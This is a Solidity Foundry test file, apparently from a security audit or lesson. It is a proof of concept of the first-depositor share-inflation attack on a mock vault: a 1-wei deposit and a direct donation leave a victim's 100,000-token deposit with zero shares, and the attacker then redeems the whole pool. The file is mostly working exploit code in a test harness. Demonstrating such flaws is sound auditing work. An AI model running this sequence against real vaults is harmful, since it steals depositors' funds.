// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {MockToken} from "../src/MockToken.sol";
import {InflatableVault} from "../src/InflatableVault.sol";

/// @title PoC: first-depositor share inflation by donation
/// @notice Attacker deposits 1 wei for 1 share, donates directly to
/// the vault to inflate the share price, the victim's deposit then
/// mints zero shares, and the attacker redeems the single share for
/// the whole pool — including the victim's deposit.
contract PoC_ShareInflation is Test {
    MockToken internal token;
    InflatableVault internal vault;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        token = new MockToken();
        vault = new InflatableVault(token);
        token.mint(attacker, 200_001 ether);
        token.mint(victim, 100_000 ether);
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    function test_ShareInflation() public {
        uint256 attackerBefore = token.balanceOf(attacker);

        // Step 1: attacker is the first depositor — 1 wei buys 1 share.
        vm.prank(attacker);
        vault.deposit(1);
        assertEq(vault.balanceOf(attacker), 1, "attacker must hold 1 share");

        // Step 2: attacker donates directly, inflating the share price
        // without minting any shares.
        vm.prank(attacker);
        token.transfer(address(vault), 100_000 ether);

        // Step 3: victim deposits 100,000 tokens, receives zero shares.
        vm.prank(victim);
        vault.deposit(100_000 ether);
        assertEq(vault.balanceOf(victim), 0, "victim must receive zero shares");

        // Step 4: attacker redeems the single share for the whole pool.
        vm.prank(attacker);
        vault.withdraw(1);

        uint256 attackerAfter = token.balanceOf(attacker);
        uint256 gain = attackerAfter - attackerBefore;
        console.log("attacker gain (ether):", gain / 1 ether);
        console.log("victim balance (ether):", token.balanceOf(victim) / 1 ether);

        assertGe(gain, 99_000 ether, "attacker must gain ~victim deposit");
        assertEq(token.balanceOf(victim), 0, "victim lost everything");
    }
}
